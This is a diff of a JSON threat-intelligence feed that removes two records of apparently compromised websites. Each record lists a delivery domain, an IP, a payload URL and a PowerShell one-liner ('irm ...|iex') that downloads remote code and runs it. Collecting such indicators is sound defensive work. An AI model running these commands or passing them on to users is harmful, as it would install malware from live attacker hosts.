@@ -8356,41 +8356,5 @@
     ],
     "ReportId": "cmwam6zr200qm0omluiv0gc85",
     "ScannedAt": "2026-11-10T11:36:24.243000+00:00"
-  },
-  {
-    "UrlDomain": "klybeck.info",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/girya/441fd4a04ee64f1b"
-    ],
-    "IP": [
-      "160.153.0.81"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/441fd4a04ee64f1b')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/Girya/441fd4a04ee64f1b"
-    ],
-    "ReportId": "cmwalq2qj00ch0omlecjbmf22",
-    "ScannedAt": "2026-11-10T11:23:14.942000+00:00"
-  },
-  {
-    "UrlDomain": "astrovastualignment.com",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "82.25.120.78"
-    ],
-    "Related": [],
-    "Payload": "irm 'browse-nnccodes.beer/02275e4ee7b11819'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/02275e4ee7b11819"
-    ],
-    "ReportId": "cmwalipbz006w0oml8w01xd4l",
-    "ScannedAt": "2026-11-10T11:17:30.993000+00:00"
   }
 ]
